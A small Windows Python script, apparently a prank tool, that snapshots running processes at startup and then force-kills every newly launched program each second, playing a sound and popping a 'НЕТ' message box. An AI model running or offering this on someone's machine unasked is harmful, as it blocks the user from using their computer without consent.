import os
from time import sleep
import _thread
import pygame

# Created by Artiom

system_pids = []
pids = []
first_start = True
pygame.mixer.init()
pygame.mixer.music.load('audio.wav')


def create_effect():
    pygame.mixer.music.play()
    with open('file.vbs', 'w') as f:
        f.write('MsgBox "НЕТ", 16, "Окно"')
    os.system('start file.vbs')


def different_pids(pids):
    global system_pids
    l = []
    for pid in pids:
        if pid not in system_pids:
            l.append(pid)
    return l


def kill_pids(pids):
    global system_pids
    to_kill = different_pids(pids)

    for pid in to_kill:
        print(pid)
        os.system('TASKKILL /F /IM {0} /T'.format(pid))
    if len(to_kill) > 0:
        create_effect()


def pid_to_list():
    l = []
    res = os.popen('tasklist /FO CSV').read().split('\n')
    for i in range(len(res)):
        res[i] = res[i].split(',')
        for j in range(0, len(res[i]), 5):
            l.append(res[i][j].replace('"', ''))
    del l[0]
    del l[-1]
    return l


def main():
    global system_pids, pids, first_start
    print('Created by Artiom ;)')
    while True:
        if first_start:
            system_pids = pid_to_list()
            system_pids.append('wscript.exe')
            first_start = False
            print(system_pids)
        else:
            pids = pid_to_list()
            _thread.start_new_thread(kill_pids, (pids,))
        sleep(1)


if __name__ == '__main__':
    main()
